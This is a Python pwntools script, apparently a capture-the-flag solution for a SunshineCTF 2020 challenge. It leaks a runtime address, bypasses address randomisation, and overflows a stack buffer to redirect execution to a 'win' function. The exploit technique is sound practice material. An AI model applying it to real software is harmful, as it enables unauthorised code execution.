# RazviOverflow
# Python3

from pwn import *

#binary = process("./chall_05")
static = ELF("./chall_05")
binary = remote("chal.2020.sunshinectf.org", 30005)

address_of_win = p64(static.symbols[b'win'])
address_of_main = p64(static.symbols[b'main'])

# Relative to main
offset_of_win = u64(address_of_win) - u64(address_of_main)

print(binary.recv())
binary.recv()
binary.sendline()
address_main_dynamic = binary.recv()
address_main_dynamic = int(str(address_main_dynamic).split(":")[1].strip()[:-3],16)

address_win_dynamic = address_main_dynamic + offset_of_win

print("Address of win_dynamic -> " + str(hex(address_win_dynamic)))

binary.sendline(b"A"*(0x40-0x08) + p64(address_win_dynamic))
binary.interactive()